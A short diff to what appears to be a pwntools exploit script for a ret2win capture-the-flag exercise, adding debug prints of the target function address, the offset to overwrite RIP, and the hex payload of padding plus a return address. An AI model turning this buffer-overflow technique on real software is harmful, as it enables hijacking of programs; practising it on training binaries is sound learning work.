@@ -20,14 +20,17 @@ def exploit(binary_path):
 
     # Get the address of the ret2win function
     ret2win_addr = elf.symbols["ret2win"]
+    print("[DEBUG] The address of ret2win() is " + str(hex(ret2win_addr)))
 
     # Get the offset by calling the find_offset function
     offset = find_offset(binary_path)
+    print("[DEBUG] The offset calculated overwrite RIP is " + str(offset) + " bytes")
 
     # Construct the payload
     payload = b'A' * offset
     payload += p32(ret2win_addr)
-
+    print("[DEBUG] The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
+    
     # Send the payload and print the output
     io.sendline(payload)
     log.info(io.clean())
